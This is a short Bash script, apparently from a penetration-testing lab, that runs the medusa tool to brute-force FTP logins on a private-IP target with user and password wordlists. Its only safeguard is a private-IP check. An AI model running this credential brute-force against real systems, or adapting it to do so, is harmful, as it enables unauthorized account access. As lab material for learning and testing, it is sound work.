#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-}"
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
USERS="$ROOT_DIR/wordlists/users.txt"
PASSWORDS="$ROOT_DIR/wordlists/passwords.txt"
OUTPUT_DIR="$ROOT_DIR/results"
OUTPUT_FILE="$OUTPUT_DIR/ftp-medusa.txt"

usage() {
  echo "Uso: $0 <ip-privado-do-alvo>"
  echo "Exemplo: $0 192.168.56.101"
}

is_private_ipv4() {
  local ip="$1"
  [[ "$ip" =~ ^10\. ]] || [[ "$ip" =~ ^192\.168\. ]] || [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]]
}

if [[ -z "$TARGET" ]]; then
  usage
  exit 1
fi

if ! is_private_ipv4 "$TARGET"; then
  echo "Erro: use apenas IP privado do laboratorio, como 192.168.56.101."
  exit 1
fi

if ! command -v medusa >/dev/null 2>&1; then
  echo "Erro: medusa nao encontrado. Instale com: sudo apt install medusa"
  exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "[+] Testando FTP no alvo autorizado: $TARGET"
echo "[+] Wordlists: $USERS / $PASSWORDS"
medusa -h "$TARGET" -U "$USERS" -P "$PASSWORDS" -M ftp -f -O "$OUTPUT_FILE"

echo "[+] Resultado salvo em: $OUTPUT_FILE"
